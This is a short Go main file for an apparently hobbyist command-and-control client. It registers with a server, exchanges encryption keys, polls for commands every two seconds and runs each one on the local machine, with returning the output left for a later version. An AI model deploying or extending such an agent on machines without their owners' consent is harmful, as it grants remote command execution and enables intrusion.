package main

import (
	"client/core"
	"fmt"
	"time"
)

func main() {
	//clientConfig := GetClientConfig()
	// post request to /client with payload {'id': clientID, 'pubKey': pubKey, 'hostName': hostName}, pubKey will be the key generated from the client thats used to encrypt the commands on the server side, will be decrypted client side.
	// after the post request, the server will send us back a publicKey which is used to encrypt the output client side, which will be decrypted server side.
	// get request to /command to receive command, post request /command with {'output': encryptedOP}

	client := core.Client{}

	if !client.InitClient() {
		return
	}

	_, err := client.IdentifyToServer()

	if err != nil {
		fmt.Println(err)
		return
	}

	for {
		time.Sleep(time.Second * 2)
		cmd, err := client.FetchCommand()

		if err != nil {
			continue
		}

		if len(client.History) > 0 {
			lastExec := client.GetLastExecutedCmd()

			// if the server doesnt have a new command, continue
			// next version will use a queue structure to handle commands.
			if lastExec.Id == cmd.Id {
				continue
			}

		}

		// no command, continue
		if cmd.Content == "N/A" {
			continue
		}

		fmt.Println("Fetched Command At Time:", cmd.ReceivedAt)

		excCmd := client.ExecuteCmd(*cmd)

		output, err := excCmd.Output()

		if err != nil {
			continue
		}

		// next update, we will send the output (encrypted) back to server, for now just print it.
		fmt.Println(string(output))

	}
}
